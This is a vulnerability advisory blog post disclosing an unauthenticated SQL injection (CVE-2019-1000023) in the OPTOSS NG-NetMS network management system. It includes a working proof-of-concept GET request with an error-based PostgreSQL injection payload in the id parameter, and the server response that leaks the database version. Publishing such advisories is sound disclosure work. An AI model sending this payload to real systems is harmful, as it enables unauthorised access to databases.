---
layout: post
title:  "SQL Injection in OPTOSS Next Gen Network Management System (NG-NetMS)"
date:   2019-01-20 19:51:02 +0700 
categories: [cve]
---

Vendor: OPT/NET BV

Product: OPTOSS Next Gen Network Management System (NG-NetMS)

Version affected: NG-NetMS v3.6-2 and earlier versions

#### Product description:
Opt/Net develops Next Gen Network Management System (NG-NetMS). This is a new web based end-to-end management tool. This project is nearly 14 years old and already proved to be indispensable tool for rapid data collection during audits and network infrastructure assessments.

This product provides near real-time visibility of the networks and ITC infrastructures and interconnected computing resources.

* CVE ID: CVE-2019-1000023
* CWE ID: CWE-89

#### #Proof of Concept

The unauthenticated SQL Injection vulnerability can be exploited by issuing a specially crafted HTTP GET request. NG-NetMS v3.4 application fails to properly sanitize untrusted data before adding it to a SQL query. A malicious attacker can include own SQL commands which database will execute.

Identified vulnerable parameters: id, id_access_type and id_attr_access.  

The following HTTP GET request allows an attacker to exploit the SQL injection vulnerability to return banner information.

#### Request:
{% highlight ruby %}
GET /index.php?id=1%27%20AND%201=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(122)||CHR(113))||(COALESCE(CAST(VERSION()%20AS%20CHARACTER(10000)),(CHR(32))))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(113)||CHR(113))%20AS%20NUMERIC)--%20&r=attrValue/index HTTP/1.1
Host: a.b.c.d
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=q42805kqdm1pq02ig6omhfn3k4
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: no-transform
{% endhighlight %}

#### Response: 
{% highlight ruby %}
HTTP/1.1 500 Internal Server Error
Date: Mon, 30 Oct 2017 05:25:01 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.11
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html
Content-Length: 43313

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>

<snip>

<h2>Error 500</h2>

<div class="error">
CDbCommand failed to execute the SQL statement: SQLSTATE[22P02]: Invalid text representation: 7 ERROR:  invalid input syntax for type numeric: &quot;qpkzq PostgreSQL 9.3.9 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4, 64-bit qjxqq&quot;</div>        </div><!-- content -->
    </div>
    <div class="span3">
        <div id="sidebar">
                </div><!-- sidebar -->
    </div>
</div>

</snip>
{% endhighlight %}

#### References
1. https://www.owasp.org/index.php/SQL_Injection
2. https://opt-net.eu/products/optoss-ng-netms
3. https://sourceforge.net/projects/ngnms/
